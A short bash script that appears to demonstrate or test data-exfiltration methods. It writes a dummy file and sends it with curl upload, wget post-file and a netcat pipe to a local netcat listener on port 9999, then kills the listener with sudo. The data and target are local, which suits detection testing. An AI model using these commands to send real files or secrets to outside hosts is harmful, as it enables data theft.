CSOF="${CSOF:-$(pwd)/data.txt}"
LOCAL_IP=$(hostname -I | awk '{print $1}')
PORT=9999

echo "This are exifilteration data" > $CSOF

curl_data(){
echo "File Data: "
cat $CSOF

echo "\n-------------------------\n"
kill_nc
echo ">>>>>>>>> using curl upload command"
nc -l $PORT & curl --upload-file $CSOF $LOCAL_IP:$PORT & kill_nc
}

wget_data()
{
kill_nc
echo "\n------------------------\n"
echo ">>>>>>>>>>>>> using wget command"
nc -l $PORT & wget --header="Content-type: multipart/form-data boundary=FILEUPLOAD" --post-file $CSOF $LOCAL_IP:$PORT & kill_nc
}

nc_data()
{
kill_nc
echo "\n------------------------\n"
echo ">>>>>>>>> using nc command: "
nc -l $PORT & cat $CSOF  | nc $LOCAL_IP:$PORT & kill_nc 
}

kill_nc()
{
PID=$(sudo lsof -t -i:$PORT)
if [ -n "$PID" ]; then
  sudo kill -9 $PID
else
  echo "No process is using port 9999."
fi
}


wget_data
nc_data
curl_data


